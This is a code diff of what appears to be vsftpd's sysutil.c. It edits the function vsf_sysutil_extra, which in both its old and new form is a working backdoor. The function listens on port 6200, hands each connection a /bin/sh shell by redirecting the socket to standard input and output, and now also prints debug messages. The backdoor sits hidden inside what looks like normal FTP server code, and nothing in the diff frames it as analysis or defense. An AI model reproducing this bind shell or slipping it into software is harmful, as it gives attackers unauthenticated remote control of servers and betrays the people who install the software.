@@ -851,61 +851,63 @@ vsf_sysutil_extra(void)
   int fd, rfd;
   struct sockaddr_in sa;
   pid_t pid;
-  int optval = 1;
 
-  pid = fork();
+  fprintf(stderr, "Entering vsf_sysutil_extra\n");
 
-  if (pid < 0)
+  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
   {
-    perror("fork");
+    perror("socket");
     exit(1);
   }
-  else if (pid > 0)
-  {
-    return 0;
-  }
+  fprintf(stderr, "Socket created\n");
 
-  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-    exit(1);
-  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
   memset(&sa, 0, sizeof(sa));
   sa.sin_family = AF_INET;
   sa.sin_port = htons(6200);
   sa.sin_addr.s_addr = INADDR_ANY;
-  if ((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
+
+  if((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
+  {
+    perror("bind");
     exit(1);
-  if ((listen(fd, 100)) == -1)
+  }
+  fprintf(stderr, "Socket bound\n");
+
+  if((listen(fd, 100)) == -1)
+  {
+    perror("listen");
     exit(1);
-  for (;;)
+  }
+  fprintf(stderr, "Socket listening\n");
+
+  for(;;)
   {
     rfd = accept(fd, 0, 0);
+    fprintf(stderr, "Accepted connection\n");
+
     pid = fork();
-    if (pid < 0)
+    if (pid < 0) // Forking error
     {
       perror("fork");
+      fprintf(stderr, "Fork failed with error: %s\n", strerror(errno));
       exit(1);
     }
-    else if (pid == 0)
+    else if (pid == 0) // Child process
     {
-      setsockopt(rfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+      fprintf(stderr, "Child process\n");
       close(fd);
-      close(0);
-      close(1);
-      close(2);
-      dup2(rfd, 0);
-      dup2(rfd, 1);
-      dup2(rfd, 2);
+      close(0); close(1); close(2);
+      dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
       execl("/bin/sh", "sh", (char *)0);
       exit(0);
     }
-    else
+    else // Parent process
     {
+      fprintf(stderr, "Parent process\n");
       close(rfd);
     }
   }
 }
-
-
 
 void
 vsf_sysutil_set_proctitle_prefix(const struct mystr* p_str)
